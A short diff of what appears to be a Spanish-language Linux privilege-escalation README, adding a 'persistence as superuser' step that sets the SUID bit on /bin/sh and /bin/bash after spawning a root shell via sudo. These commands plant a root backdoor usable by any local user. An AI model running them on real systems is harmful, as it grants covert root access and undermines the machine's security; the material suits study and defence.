@@ -22,6 +22,12 @@ $/usr/bin/sudo /bin/sh -p
 
 $whoami
 
+3º.- Persistencia como SuperUser;
+
+$ sudo chmod +s /bin/sh
+$ sudo chmod +s /bin/bash # esto activa el bit SUID (4000) sobre /bin/bash, cualquier usuario que ejecute /bin/bash tendra privilegios de root.
+
+
 <img style="float:left" alt="sudo elevacion de privilegios a root" src="https://github.com/hackingyseguridad/root/blob/master/root.jpg">
 
 **Exploits publicos para elevar privilegios a root, OS Linux**
